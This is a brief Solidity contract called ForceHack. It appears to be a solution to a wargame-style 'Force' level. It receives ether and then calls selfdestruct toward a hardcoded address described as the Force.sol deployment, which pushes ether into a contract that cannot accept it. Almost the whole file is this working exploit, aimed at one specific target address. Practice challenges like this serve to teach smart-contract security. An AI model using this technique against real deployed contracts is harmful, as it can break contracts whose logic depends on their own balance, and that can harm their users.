
pragma solidity ^0.6.0;


contract ForceHack{

    function receive() public payable returns (uint){
        // receive some ether and return the contract balance as a uint
        return address(this).balance;
    }

    function selfDestruct() public{

        // set address to the deployment addr for Force.sol
        address payable contract_address = 0x83867758a9A4D667c78fCE37b63483151114436D;
        selfdestruct(contract_address);
    }


}